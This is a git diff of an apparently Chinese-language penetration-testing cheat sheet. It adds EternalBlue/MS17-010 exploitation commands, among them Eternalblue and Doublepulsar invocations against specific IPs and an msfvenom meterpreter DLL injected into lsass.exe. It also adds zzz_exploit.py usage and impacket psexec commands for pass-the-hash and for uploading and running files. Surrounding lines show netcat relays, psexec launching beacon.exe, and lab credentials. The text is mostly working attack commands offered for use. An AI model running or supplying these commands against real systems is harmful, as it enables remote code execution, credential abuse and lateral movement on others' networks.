@@ -54,8 +54,9 @@ nc -l -p 8888 -c "nc 192.168.19.153 22"
 ```bash
 while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 ```
-### 17-010: AutoBlue-MS17-010
+### MS17-010: AutoBlue-MS17-010
 [​MS17010打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
+[py/Cobalt Strike DLL](https://www.cnblogs.com/Thorndike/p/15242477.html)
 
 常用 
 ```sh
@@ -63,6 +64,7 @@ Ladon.exe 192.168.50.153 MS17010
 fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
 # "1qaz@WSX!@#4"
 # 3. https://www.freebuf.com/vuls/356052.html
+Eternalblue
 ```
 
 ```shell
@@ -102,6 +104,21 @@ python2 eternalblue_exploit7.py ip shellcode/sc_all.bin
 
 # server2012_win8.1+ 
 python2 eternalblue_exploit8.py ip shellcode/sc_all.bin
+```
+
+
+Eternalblue
+```
+Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 10.10.20.7 --TargetPort 445
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll
+Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.52.143 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload bind.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60
+```
+
+zzz_exploit.py
+```
+# Pipe
+netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd ```netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd
+python zzz_exploit.py <ip> <pipe>
 ```
 ### Ladon
 [Usage](https://github.com/k8gege/Ladon/wiki/Ladon-Usage)
@@ -492,17 +509,22 @@ psexec \\ip -u administrator -p admin whoami all 执行命令
 psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件
 psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件
 ```
-## impacket
-
+## impacket/psexec.py
 
 ```sh
 # 注意前缀本例是域名 god/
 # 1.命令行
 python psexec.py god/administrator:hongrisec@2019@192.168.52.143
 python smbexec.py god/administrator:hongrisec@2019@192.168.52.143 
+## hash 认证
+python psexec.py -hashes :8a963371a63944419ec1adf687bb1be5 god/administrator@192.168.52.143
 # 1.1 msf msf_psexec.rc
 # 2.执行命令
 python psexec.py god/administrator:hongrisec@2019@192.168.52.143 ipconfig
+# 3.上传文件并执行
+python psexec.py god/administrator:hongrisec@2019@192.168.52.143 -c 1.bat 
+
+
 ```
 
 ## mstsc
